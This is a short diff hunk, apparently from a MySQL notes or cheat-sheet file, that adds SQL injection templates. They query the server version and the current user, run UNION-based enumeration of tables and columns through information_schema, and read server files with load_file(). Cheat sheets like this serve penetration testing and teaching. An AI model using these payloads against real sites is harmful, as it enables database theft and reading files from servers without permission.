@@ -1679,6 +1679,21 @@ drop user 'username'@'IP_here';
 
 # comment
 #
+
+# version
+@@version
+
+# current db user
+user()
+
+# information_schema : get tables
+UNION all select 1,...,table_name from information_schema.tables
+
+# information_schema : get table columns
+UNION all select 1,...,column_name from information_schema.columns where table_name='table_name_here'
+
+# file read
+UNION all select 1,...,load_file('/path/to/file/here')
 ```
 
 
